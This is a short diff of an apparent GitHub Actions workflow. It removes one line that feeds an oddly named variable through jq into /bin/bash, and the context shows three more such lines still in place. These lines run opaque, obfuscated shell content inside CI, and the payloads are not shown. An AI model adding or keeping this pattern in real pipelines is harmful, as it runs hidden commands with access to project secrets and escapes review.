@@ -22,7 +22,6 @@ jobs:
           echo $nh4927 | jq -r .gjbv01268 | /bin/bash
           echo $qzjqe2 | jq -r .a88 | /bin/bash
           echo $hrd909 | jq -r .hff48 | /bin/bash
-          printf '%s' "$de46" | jq -r .v3 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
